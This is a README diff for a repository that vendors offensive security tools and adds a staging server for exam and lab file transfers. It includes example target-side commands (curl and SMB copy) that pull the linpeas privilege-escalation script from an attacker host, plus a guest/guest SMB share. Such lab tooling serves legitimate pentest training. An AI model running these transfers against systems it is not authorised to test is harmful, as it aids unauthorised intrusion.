@@ -8,8 +8,53 @@ Offline vendoring repository for curated cybersecurity tools. A manifest declare
 cyber-tools/
 ├── tools.json                  # declare each tool + how to grab it
 ├── sync.sh                     # the sync engine
+├── scripts/
+│   ├── install.sh              # one-step sync + extras (AccessChk, extract Python)
+│   └── serve.sh                # one-command HTTP + SMB staging server
 ├── .github/workflows/sync.yml  # daily cron + manual trigger
 └── tools/                      # auto-populated, one dir per tool
+```
+
+## Quick start
+
+```bash
+chmod +x sync.sh scripts/*.sh
+./scripts/install.sh
+```
+
+Optional: pass a GitHub token to raise API rate limits during sync:
+
+```bash
+GITHUB_TOKEN=<PAT> ./scripts/install.sh
+```
+
+## Staging server (HTTP + SMB)
+
+After install, stand up a file server for exam/lab transfers with one command:
+
+```bash
+./scripts/serve.sh
+```
+
+Defaults:
+
+| Service | Default | Override |
+|---------|---------|----------|
+| HTTP | `http://0.0.0.0:8080/` | `HTTP_PORT=9000 ./scripts/serve.sh` |
+| SMB share | `\\<your-ip>\tools` | `SMB_SHARE=loot ./scripts/serve.sh` |
+| SMB credentials | `guest` / `guest` | `SMB_USER=... SMB_PASS=... ./scripts/serve.sh` |
+| Served directory | `./tools/` | `SERVE_DIR=/path/to/files ./scripts/serve.sh` |
+
+HTTP uses Python's built-in server. SMB uses `impacket-smbserver` (or `smbserver.py`) if installed (`pip install impacket`). Without impacket, HTTP still works and a warning is printed.
+
+Example target-side fetches:
+
+```powershell
+# HTTP
+curl http://10.10.14.5:8080/peass-ng/linpeas.sh -o linpeas.sh
+
+# SMB
+copy \\10.10.14.5\tools\peass-ng\linpeas.sh .
 ```
 
 ## Acquisition strategies
@@ -67,6 +112,13 @@ Add one JSON object to the `tools` array in `tools.json`. No script edits requir
 ```
 
 - Re-fetched every sync run; Git diff detection avoids empty commits when nothing changed upstream.
+
+## Extras fetched by install.sh
+
+Some tools are not in `tools.json` because they have no suitable GitHub source:
+
+- **AccessChk** — downloaded from the official Sysinternals endpoint (`live.sysinternals.com`) into `tools/accesschk/`. This is the known-good source for `accesschk.exe` and `accesschk64.exe`.
+- **Portable Python** — the `static-python` release tarball is extracted automatically after sync.
 
 ## Local testing
 
